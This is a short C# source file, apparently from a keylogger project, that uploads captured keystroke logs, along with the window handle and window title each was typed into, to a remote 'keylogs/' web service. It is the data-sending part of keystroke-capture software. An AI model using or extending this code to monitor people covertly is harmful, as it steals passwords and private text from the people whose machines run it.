using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using RestSharp;
using System.Windows.Forms;

namespace Logger.Web
{
    using Keyboard;

    partial class Webservice
    {
        public void SubmitKeylog(Keylog keylog)
        {
            Execute(new KeylogSubmitRequest(keylog));
        }

        public void SubmitKeylogs(IEnumerable<Keylog> keylogs)
        {            
            Execute(new KeylogSubmitRequest(keylogs));
        }

        public async Task SubmitKeylogAsync(IEnumerable<Keylog> keylog)
        {
            await ExecuteAsync(new KeylogSubmitRequest(keylog));
        } 

        public async Task SubmitKeylogsAsync(IEnumerable<Keylog> keylogs)
        {
            await ExecuteAsync(new KeylogSubmitRequest(keylogs));
        }
    }

    class KeylogSubmitRequest : SubmitRequest<Keylog>
    {
        const string resource = "keylogs/";

        public KeylogSubmitRequest(Keylog keylog) : base(resource, keylog) { }

        public KeylogSubmitRequest(IEnumerable<Keylog> keylogs) : base(resource, keylogs) { }

        override protected object ToJSONShape(Keylog keylog)
        {
            return new { log = keylog.Log,
                         window_handle = keylog.WindowHandle.ToString(),
                         window_title = keylog.WindowTitle };
        }
    }
}
